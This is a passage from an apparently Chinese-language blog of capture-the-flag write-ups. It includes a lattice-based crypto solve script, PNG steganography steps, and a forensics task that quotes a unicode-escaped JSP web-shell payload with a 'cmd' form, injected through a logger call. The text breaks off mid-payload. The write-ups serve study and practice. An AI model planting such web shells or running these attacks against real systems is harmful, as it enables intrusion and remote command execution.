f(x_1, x_2) = x_1 x_2 + A x_1 + B x_2 + C \equiv 0 \pmod{p}</script><p>满足 $|x_1| &lt; X_1$， $|x_2| &lt; X_2$。</p>
<p>考虑多项式集合：</p>
<script type="math/tex; mode=display">
\{f(x_1,x_2),\; p,\; p x_1,\; p x_2\}</script><p>在单项式基 ${1, x_1, x_2, x_1 x_2}$ 下，加权 $(1, X_1, X_2, X_1 X_2)$ 得格基矩阵：</p>
<script type="math/tex; mode=display">
M = \begin{bmatrix}
C & A X_1 & B X_2 & X_1 X_2 \\
p & 0 & 0 & 0 \\
0 & p X_1 & 0 & 0 \\
0 & 0 & p X_2 & 0
\end{bmatrix}</script><p>对 $M$ 进行 LLL 约简，得到短向量对应整数多项式 $g_1,g_2$：</p>
<script type="math/tex; mode=display">
\begin{aligned}
g_1(x_1,x_2) &= a_0 + a_1 x_1 + a_2 x_2 + a_3 x_1 x_2 \\
g_2(x_1,x_2) &= b_0 + b_1 x_1 + b_2 x_2 + b_3 x_1 x_2
\end{aligned}</script><p>在整数上满足 $g_i(x_1,x_2)=0$。</p>
<h2 id="-2"><a href="#-2" class="headerlink" title=" "></a> </h2><p>将 $g_1,g_2$ 写成：</p>
<script type="math/tex; mode=display">
\begin{aligned}
(a_3 x_2 + a_1) x_1 + (a_2 x_2 + a_0) &= 0 \\
(b_3 x_2 + b_1) x_1 + (b_2 x_2 + b_0) &= 0
\end{aligned}</script><p>消去 $x_1$，系数行列式为零：</p>
<script type="math/tex; mode=display">
(a_3 x_2 + a_1)(b_2 x_2 + b_0) - (b_3 x_2 + b_1)(a_2 x_2 + a_0) = 0</script><p>展开得 $x_2$ 的二次方程：</p>
<script type="math/tex; mode=display">
Q_A x_2^2 + Q_B x_2 + Q_C = 0</script><p>其中：</p>
<script type="math/tex; mode=display">
\begin{aligned}
Q_A &= a_3 b_2 - b_3 a_2 \\
Q_B &= a_3 b_0 + a_1 b_2 - b_3 a_0 - b_1 a_2 \\
Q_C &= a_1 b_0 - b_1 a_0
\end{aligned}</script><h2 id="-3"><a href="#-3" class="headerlink" title=" "></a> </h2><p>解二次方程得候选 $x_2$，对每个候选 $x_2$ 回代 $g_1=0$：</p>
<script type="math/tex; mode=display">
x_1 = -\frac{a_2 x_2 + a_0}{a_3 x_2 + a_1}</script><p>筛选满足 $0 \le x_1 &lt; X_1,\; 0 \le x_2 &lt; X_2$ 的整数解。</p>
<h2 id="-4"><a href="#-4" class="headerlink" title=" "></a> </h2><p>计算：</p>
<script type="math/tex; mode=display">
\begin{aligned}
t_1 &= H_1 + x_1 \\
t_1^{-1} &\equiv t_1^{\varphi(p)-1} \pmod{p} \quad (\text{或用扩展欧几里得})
\end{aligned}</script><p>由 $t_1 \equiv k \cdot (m + r_1)^{-1} \pmod{p}$ 得：</p>
<script type="math/tex; mode=display">
m + r_1 \equiv k \cdot t_1^{-1} \pmod{p}</script><script type="math/tex; mode=display">
m \equiv (k \cdot t_1^{-1} - r_1) \bmod p</script><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> decimal <span class="keyword">import</span> Decimal, getcontext</span><br><span class="line"></span><br><span class="line"><span class="comment"># Set high precision for LLL arithmetic with large numbers</span></span><br><span class="line">getcontext().prec = <span class="number">2000</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># --- Problem Data ---</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">N = <span class="number">3333577291839009732612693330613476891341287017491683764014849337158389717338712200133085615150269196268856288361865352673921704626130772582853528604556994221890454520933132803888321775335519781063447756692130742361931522856942232406992357982482263472763363458621836220024977864980600979194500121897419553619426163227</span></span><br><span class="line">c = <span class="number">1277272201928931051067525742142583320131498687502905469530557519241347169899260720694873154669476372724906606385788056536109971768256973988460766527896895880291037980646963981472637862512247195798266373251524526460097881602691641026093728861572872156172787168597410496150253340538386296663073088345799201197096884740</span></span><br><span class="line">k = <span class="number">9352039867057736323</span></span><br><span class="line">r1 = <span class="number">10421792656200324147964684790160875926436411483496860422433732508593789212449544620816674407170998779863336939494663076247759140488927744939619406024905901</span></span><br><span class="line">r2 = <span class="number">8806088830734144089522276896226392806947836111998696180055727048752624989402057411311728398322297424598954586424896296000606209022432442660527640463521679</span></span><br><span class="line">leak1 = <span class="number">4266222222502644630611545246271868348722888987303187402827005454059765428769160822475080050046035916876078546634293907218937483241284454918367519709206766322037148585465519188582916280829212776096606923824120883699251868362915920299645</span></span><br><span class="line">leak2 = <span class="number">1176921186497191878459783787148403806360469809421921990427675048480656171919274113895695842508460760829511824635106692634456334400022597605585661597793889066395539405395254174368285751236344600489419240628821864912762242188289636510706</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># --- Helper Functions ---</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">inverse</span>(<span class="params">a, n</span>):</span><br><span class="line">    t, newt = <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    r, newr = n, a</span><br><span class="line">    <span class="keyword">while</span> newr != <span class="number">0</span>:</span><br><span class="line">        quotient = r // newr</span><br><span class="line">        t, newt = newt, t - quotient * newt</span><br><span class="line">        r, newr = newr, r - quotient * newr</span><br><span class="line">    <span class="keyword">if</span> r &gt; <span class="number">1</span>: <span class="keyword">raise</span> ValueError(<span class="string">&quot;a is not invertible&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> t &lt; <span class="number">0</span>: t = t + n</span><br><span class="line">    <span class="keyword">return</span> t</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gram_schmidt</span>(<span class="params">basis</span>):</span><br><span class="line">    n = <span class="built_in">len</span>(basis)</span><br><span class="line">    mu = [[Decimal(<span class="number">0</span>)] * n <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n)]</span><br><span class="line">    B = [Decimal(<span class="number">0</span>)] * n</span><br><span class="line">    b_star = [<span class="literal">None</span>] * n</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        vec_i = [Decimal(x) <span class="keyword">for</span> x <span class="keyword">in</span> basis[i]]</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i):</span><br><span class="line">            dot = <span class="built_in">sum</span>(vec_i[k] * b_star[j][k] <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(vec_i)))</span><br><span class="line">            mu[i][j] = dot / B[j]</span><br><span class="line">            vec_i = [vec_i[k] - mu[i][j] * b_star[j][k] <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(vec_i))]</span><br><span class="line">        b_star[i] = vec_i</span><br><span class="line">        B[i] = <span class="built_in">sum</span>(x*x <span class="keyword">for</span> x <span class="keyword">in</span> vec_i)</span><br><span class="line">    <span class="keyword">return</span> mu, B</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lll_reduction</span>(<span class="params">basis, delta=Decimal(<span class="params"><span class="string">&quot;0.99&quot;</span></span>)</span>):</span><br><span class="line">    n = <span class="built_in">len</span>(basis)</span><br><span class="line">    k = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> k &lt; n:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(k - <span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">            mu, B = gram_schmidt(basis)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">abs</span>(mu[k][j]) &gt; Decimal(<span class="string">&quot;0.5&quot;</span>):</span><br><span class="line">                q = <span class="built_in">int</span>((mu[k][j]).to_integral_value(rounding=<span class="string">&#x27;ROUND_HALF_EVEN&#x27;</span>))</span><br><span class="line">                basis[k] = [basis[k][x] - q * basis[j][x] <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(basis[k]))]</span><br><span class="line">        mu, B = gram_schmidt(basis)</span><br><span class="line">        <span class="keyword">if</span> B[k] &lt; (delta - mu[k][k-<span class="number">1</span>]**<span class="number">2</span>) * B[k-<span class="number">1</span>]:</span><br><span class="line">            basis[k], basis[k-<span class="number">1</span>] = basis[k-<span class="number">1</span>], basis[k]</span><br><span class="line">            k = <span class="built_in">max</span>(k - <span class="number">1</span>, <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            k += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> basis</span><br><span class="line"></span><br><span class="line"><span class="comment"># --- Solution ---</span></span><br><span class="line"><span class="comment"># 1. Factor N (q is small, ~25 bits)</span></span><br><span class="line">q = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>, <span class="number">2</span>**<span class="number">26</span>, <span class="number">2</span>):</span><br><span class="line">    <span class="keyword">if</span> N % i == <span class="number">0</span>:</span><br><span class="line">        q = i</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">p = N // q</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. Setup Bivariate Polynomial F(x1, x2) = 0 mod p</span></span><br><span class="line">H1 = leak1 &lt;&lt; <span class="number">244</span></span><br><span class="line">H2 = leak2 &lt;&lt; <span class="number">244</span></span><br><span class="line">dr = r2 - r1</span><br><span class="line"><span class="comment"># Coefficients derived from: k(t2 - t1) + t1*t2*dr = 0 mod p</span></span><br><span class="line">C_x1x2 = dr % p</span><br><span class="line">C_x1 = (dr * H2 - k) % p</span><br><span class="line">C_x2 = (dr * H1 + k) % p</span><br><span class="line">C_1 = (k * (H2 - H1) + dr * H1 * H2) % p</span><br><span class="line"></span><br><span class="line"><span class="comment"># Normalize to make x1x2 coefficient 1</span></span><br><span class="line">inv_dr = inverse(C_x1x2, p)</span><br><span class="line">A = (C_x1 * inv_dr) % p  <span class="comment"># Coeff of x1</span></span><br><span class="line">B = (C_x2 * inv_dr) % p  <span class="comment"># Coeff of x2</span></span><br><span class="line">C = (C_1 * inv_dr) % p   <span class="comment"># Constant</span></span><br><span class="line"></span><br><span class="line">X1 = <span class="number">1</span> &lt;&lt; <span class="number">244</span></span><br><span class="line">X2 = <span class="number">1</span> &lt;&lt; <span class="number">244</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Lattice Basis for F(x1, x2) = x1x2 + A*x1 + B*x2 + C</span></span><br><span class="line"><span class="comment"># Columns correspond to monomials: [1, x1, x2, x1x2]</span></span><br><span class="line"><span class="comment"># Weights: [1, X1, X2, X1*X2]</span></span><br><span class="line">basis = [</span><br><span class="line">    [C, A * X1, B * X2, X1 * X2], <span class="comment"># F</span></span><br><span class="line">    [p, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>],                 <span class="comment"># p</span></span><br><span class="line">    [<span class="number">0</span>, p * X1, <span class="number">0</span>, <span class="number">0</span>],            <span class="comment"># p*x1</span></span><br><span class="line">    [<span class="number">0</span>, <span class="number">0</span>, p * X2, <span class="number">0</span>]             <span class="comment"># p*x2</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">reduced_basis = lll_reduction(basis)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Extract polynomials from short vectors</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_coeffs</span>(<span class="params">vec</span>):</span><br><span class="line">    <span class="keyword">return</span> vec[<span class="number">0</span>], vec[<span class="number">1</span>] // X1, vec[<span class="number">2</span>] // X2, vec[<span class="number">3</span>] // (X1 * X2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Use resultant of first two vectors to solve</span></span><br><span class="line">v1 = reduced_basis[<span class="number">0</span>]</span><br><span class="line">v2 = reduced_basis[<span class="number">1</span>]</span><br><span class="line">c0, c1, c2, c3 = get_coeffs(v1)</span><br><span class="line">d0, d1, d2, d3 = get_coeffs(v2)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Resultant wrt x1: (c3*x2 + c1)(d2*x2 + d0) - (d3*x2 + d1)(c2*x2 + c0) = 0</span></span><br><span class="line"><span class="comment"># Quadratic in x2: QA*x2^2 + QB*x2 + QC = 0</span></span><br><span class="line">QA = c3 * d2 - d3 * c2</span><br><span class="line">QB = c3 * d0 + c1 * d2 - d3 * c0 - d1 * c2</span><br><span class="line">QC = c1 * d0 - d1 * c0</span><br><span class="line"></span><br><span class="line"><span class="comment"># Solve quadratic</span></span><br><span class="line">delta_quad = QB*QB - <span class="number">4</span>*QA*QC</span><br><span class="line"><span class="keyword">if</span> delta_quad &gt;= <span class="number">0</span>:</span><br><span class="line">    isqrt_val = <span class="built_in">int</span>(Decimal(delta_quad).sqrt())</span><br><span class="line">    <span class="keyword">if</span> isqrt_val * isqrt_val == delta_quad:</span><br><span class="line">        roots = []</span><br><span class="line">        <span class="keyword">if</span> QA != <span class="number">0</span>:</span><br><span class="line">            roots.append((-QB + isqrt_val) // (<span class="number">2</span> * QA))</span><br><span class="line">            roots.append((-QB - isqrt_val) // (<span class="number">2</span> * QA))</span><br><span class="line">        <span class="keyword">elif</span> QB != <span class="number">0</span>:</span><br><span class="line">            roots.append(-QC // QB)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> rx2 <span class="keyword">in</span> roots:</span><br><span class="line">            <span class="comment"># Check x2 range</span></span><br><span class="line">            <span class="keyword">if</span> <span class="number">0</span> &lt;= rx2 &lt; X2:</span><br><span class="line">                <span class="comment"># Solve for x1: x1(c3*rx2 + c1) = -(c2*rx2 + c0)</span></span><br><span class="line">                denom = c3 * rx2 + c1</span><br><span class="line">                num = - (c2 * rx2 + c0)</span><br><span class="line">                <span class="keyword">if</span> denom != <span class="number">0</span> <span class="keyword">and</span> num % denom == <span class="number">0</span>:</span><br><span class="line">                    rx1 = num // denom</span><br><span class="line">                    <span class="keyword">if</span> <span class="number">0</span> &lt;= rx1 &lt; X1:</span><br><span class="line">                        <span class="comment"># Recover m</span></span><br><span class="line">                        t1 = (H1 + rx1) % p</span><br><span class="line">                        m = (k * inverse(t1, p) - r1) % p</span><br><span class="line">                        <span class="keyword">try</span>:</span><br><span class="line">                            flag = m.to_bytes((m.bit_length()+<span class="number">7</span>)//<span class="number">8</span>, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">                            <span class="built_in">print</span>(flag.decode())</span><br><span class="line">                        <span class="keyword">except</span>:</span><br><span class="line">                            <span class="keyword">pass</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>flag{H4hAHhhHh4_c0pP3r_N07_v1OI3n7_3n0uGh}</strong></p>
<script type="math/tex; mode=display">
\begin{aligned}
q &= ????????,\quad p = \frac{N}{q},\quad H_1 = \text{leak}_1 \cdot 2^{244},\quad H_2 = \text{leak}_2 \cdot 2^{244},\\
x_1 &= t_1 \bmod 2^{244},\; 0 \le x_1 < 2^{244},\quad x_2 = t_2 \bmod 2^{244},\; 0 \le x_2 < 2^{244},\\
T_1 &= H_1 + x_1,\quad T_2 = H_2 + x_2,\\
(r_1 - r_2) &\equiv k(t_1^{-1} - t_2^{-1}) \pmod{p} \equiv k \cdot \frac{t_2 - t_1}{t_1 t_2} \pmod{p},\\
k(t_2 - t_1) &- (r_1 - r_2)t_1 t_2 \equiv 0 \pmod{p},\\
d_r &= r_2 - r_1,\quad k(T_2 - T_1) - d_r T_1 T_2 \equiv 0 \pmod{p} \quad (1),\\
k(H_2 &+ x_2 - H_1 - x_1) - d_r(H_1 + x_1)(H_2 + x_2) \equiv 0 \pmod{p},\\
k(H_2 - H_1) &+ kx_2 - kx_1 - d_r H_1 H_2 - d_r H_1 x_2 - d_r H_2 x_1 - d_r x_1 x_2 \equiv 0 \pmod{p},\\
(-d_r H_2 &- k)x_1 + (-d_r H_1 + k)x_2 - d_r x_1 x_2 + [k(H_2 - H_1) - d_r H_1 H_2] \equiv 0 \pmod{p},\\
C_{x_1x_2} &= -d_r,\; C_{x_1} = -d_r H_2 - k,\; C_{x_2} = -d_r H_1 + k,\; C_1 = k(H_2 - H_1) - d_r H_1 H_2,\\
C_{x_1x_2} &x_1 x_2 + C_{x_1} x_1 + C_{x_2} x_2 + C_1 \equiv 0 \pmod{p} \quad (2),\\
d &= C_{x_1x_2}^{-1} \bmod p,\quad x_1 x_2 + A x_1 + B x_2 + C \equiv 0 \pmod{p},\\
A &= C_{x_1} \cdot d \bmod p,\; B = C_{x_2} \cdot d \bmod p,\; C = C_1 \cdot d \bmod p,\\
X_1 &= X_2 = 2^{244},\quad f(x_1, x_2) = x_1 x_2 + A x_1 + B x_2 + C \equiv 0 \pmod{p},\\
M &= \begin{bmatrix}
C & A X_1 & B X_2 & X_1 X_2 \\
p & 0 & 0 & 0 \\
0 & p X_1 & 0 & 0 \\
0 & 0 & p X_2 & 0
\end{bmatrix},\\
g_1(x_1,x_2) &= a_0 + a_1 x_1 + a_2 x_2 + a_3 x_1 x_2,\quad g_2(x_1,x_2) = b_0 + b_1 x_1 + b_2 x_2 + b_3 x_1 x_2,\\
(a_3 x_2 + a_1) &x_1 + (a_2 x_2 + a_0) = 0,\quad (b_3 x_2 + b_1) x_1 + (b_2 x_2 + b_0) = 0,\\
(a_3 x_2 + a_1)&(b_2 x_2 + b_0) - (b_3 x_2 + b_1)(a_2 x_2 + a_0) = 0,\\
Q_A x_2^2 &+ Q_B x_2 + Q_C = 0,\quad Q_A = a_3 b_2 - b_3 a_2,\\
Q_B &= a_3 b_0 + a_1 b_2 - b_3 a_0 - b_1 a_2,\quad Q_C = a_1 b_0 - b_1 a_0,\\
x_1 &= -\frac{a_2 x_2 + a_0}{a_3 x_2 + a_1},\quad 0 \le x_1 < X_1,\; 0 \le x_2 < X_2,\\
t_1 &= H_1 + x_1,\quad t_1^{-1} \equiv t_1^{\varphi(p)-1} \pmod{p},\\
m + r_1 &\equiv k \cdot t_1^{-1} \pmod{p},\quad m \equiv (k \cdot t_1^{-1} - r_1) \bmod p.
\end{aligned}</script>
      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/12/23/CBCTF2025-wp/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/headimage.jpg">
      <meta itemprop="name" content="Rekjo">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content=" | Hexo">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2025/12/23/CBCTF2025-wp/" class="post-title-link" itemprop="url">CBCTF2025_wp</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>
      

      <time title="Created: 2025-12-23 22:01:24 / Modified: 22:12:47" itemprop="dateCreated datePublished" datetime="2025-12-23T22:01:24+08:00">2025-12-23</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="CBCTF-2025"><a href="#CBCTF-2025" class="headerlink" title="CBCTF 2025"></a>CBCTF 2025</h1><hr>
<p>很晚才知道这个比赛，可惜逆向有些题没时间做了……</p>
<p><img src="/images/image-20251223221105.png" alt=""></p>
<p>[TOC]</p>
<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a><strong>misc</strong></h2><ul>
<li><p>strange_png</p>
<blockquote>
<p>这是一张sheep家的狗狗照片，里面藏了什么呢？</p>
</blockquote>
</li>
</ul>
<blockquote id="fn_附件">
<sup>附件</sup>. misc.png<a href="#reffn_附件" title="Jump back to footnote [附件] in the text."> &#8617;</a>
</blockquote>
<p>既然是藏了什么，不妨先binwalk提取一下试试。注意root提权</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># binwalk -e --run-as=root misc.png</span><br></pre></td></tr></table></figure>
<p><img src="/images/image-20251122173905690.png" alt=""></p>
<p><img src="/images/image-20251122173951383.png" alt=""></p>
<p><img src="/images/image-20251122174101596.png" alt=""></p>
<p>于是尝试解压CCC66.zip，加密了；分析前面的zlib数据，尝试后也无用</p>
<p>难道要rockyou.txt爆破？那真是疯了</p>
<p>冷静思考，考虑到题目中说的图片，于是把这些多余数据去掉，看能否得到图片</p>
<p>先010 editor找一找边界</p>
<p><img src="/images/image-20251122175459026" alt=""></p>
<p>结束标志是IEND chunk 即<strong>00 00 00 00 49 45 4E 44 AE 42 60 82</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">dd</span> <span class="keyword">if</span>=misc.png of=clean.png bs=1 count=838757</span><br></pre></td></tr></table></figure>
<p>还是打不开。HxD,发现文件头不对。正确的是<strong>89 50 4E 47 0D 0A 1A 0A</strong></p>
<p><img src="/images/image-20251122183600973.png" alt=""></p>
<p>补上<strong>89 50 4E 47</strong>即可</p>
<p>从而得到狗狗图片</p>
<p><img src="/images/clean.png" alt=""></p>
<p>可是密码是什么呢？猜想如dog,puppy,sheep,dogdog,123456,666, ,都不对 </p>
<p>于是盲猜一手LSB隐写，这里ai推了一个很好用的工具<strong>zsteg</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gem install zsteg</span><br></pre></td></tr></table></figure>
<p>下载后直接</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zsteg clean.png</span><br></pre></td></tr></table></figure>
<p><img src="/images/image-20251122184026692.png" alt=""></p>
<p>尝试<strong><code>30HDdsaHsjfisdf123321</code></strong>解压成功</p>
<p>幸好没爆破，这什么诡异密码:face_with_head_bandage:</p>
<p>打开得到<strong>INBEGVCGPN3WK3DDGBWWKX3UN5PW22JVMNPXOMDSGFSCC7I=</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;INBEGVCGPN3WK3DDGBWWKX3UN5PW22JVMNPXOMDSGFSCC7I=&quot;</span> | <span class="built_in">base32</span> -d</span><br></pre></td></tr></table></figure>
<p>结果<strong>CBCTF{welc0me_to_mi5c_w0r1d!}</strong></p>
<ul>
<li><p>EZSocialEngineering</p>
<blockquote>
<p>今天rocket瞟到int在看的一个视频, 他觉得很有意思, 这是其中一帧的截图, 你可以帮rocket找出视频的b站id吗? 提交CBCTF{BV号}即可</p>
</blockquote>
</li>
</ul>
<p>下载文件，发现右上角明显有up名字Ele实验室，逐个尝试即可</p>
<p>BV号示例：</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.bilibili.com/video/BV1KQ4y117nq/?spm_id_from=333.1387.upload.video_card.click&amp;vd_source=7119de8ded3d49fa9f82ff02e78fa678</span><br></pre></td></tr></table></figure>
<p>BV1KQ4y117nq就是本题的BV号。</p>
<p>于是<strong>CBCTF{BV1KQ4y117nq}</strong></p>
<ul>
<li>Realworld-HackVcenter</li>
</ul>
<blockquote>
<p>某个APT(高级持续性威胁)组织试图攻击某高校的校园网络的Hypervisor管理器, 但是该校的网安社团早有预警, 并已经部署某个程序在背后观察着该APT组织的一举一动并准备反制, 现在你作为社团的一员, 请你协助找出一些线索.</p>
<p>提交flag时把flag{}替换为CBCTF{}</p>
</blockquote>
<p>notepad打开，这一大段应该很醒目</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$logger.warn(\&quot;\\u003c\\u0025\\u0040\\u0020\\u0070\\u0061\\u0067\\u0065\\u0020\\u0069\\u006d\\u0070\\u006f\\u0072\\u0074\\u003d\\u0022\\u006a\\u0061\\u0076\\u0061\\u002e\\u0075\\u0074\\u0069\\u006c\\u002e\\u002a\\u002c\\u006a\\u0061\\u0076\\u0061\\u002e\\u0069\\u006f\\u002e\\u002a\\u0022\\u0025\\u003e\\u000a\\u003c\\u0068\\u0074\\u006d\\u006c\\u003e\\u000a\\u0020\\u0020\\u0020\\u0020\\u003c\\u0062\\u006f\\u0064\\u0079\\u003e\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u003c\\u0066\\u006f\\u0072\\u006d\\u0020\\u006d\\u0065\\u0074\\u0068\\u006f\\u0064\\u003d\\u0022\\u0067\\u0065\\u0074\\u0022\\u003e\\u000a\\u0009\\u0009\\u003c\\u0069\\u006e\\u0070\\u0075\\u0074\\u0020\\u0074\\u0079\\u0070\\u0065\\u003d\\u0022\\u0074\\u0065\\u0078\\u0074\\u0022\\u0020\\u006e\\u0061\\u006d\\u0065\\u003d\\u0022\\u0063\\u006d\\u0064\\u0022\\u0020\\u0076\\u0061\\u006c\\u0075\\u0065\\u003d\\u0022\\u0066\\u006c\\u0061\\u0067\\u007b\\u0035\\u0037\\u0033\\u0038\\u0039\\u0030\\u0038\\u0034\\u0037\\u0039\\u0030\\u0031\\u0038\\u0034\\u0037\\u0039\\u0038\\u0031\\u0032\\u0037\\u0039\\u0030\\u0038\\u007d\\u0022\\u003e\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u003c\\u0069\\u006e\\u0070\\u0075\\u0074\\u0020\\u0074\\u0079\\u0070\\u0065\\u003d\\u0022\\u0073\\u0075\\u0062\\u006d\\u0069\\u0074\\u0022\\u0020\\u0076\\u0061\\u006c\\u0075\\u0065\\u003d\\u0022\\u0053\\u0065\\u006e\\u0064\\u0022\\u003e\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u003c\\u002f\\u0066\\u006f\\u0072\\u006d\\u003e\\u000a\\u0020\\u0020\\u0020\\u0020\\u003c\\u0070\\u0072\\u0065\\u003e\\u000a\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u0020\\u003c\\u0025\\u000a\\u0020\\u0020\\u0020\\u0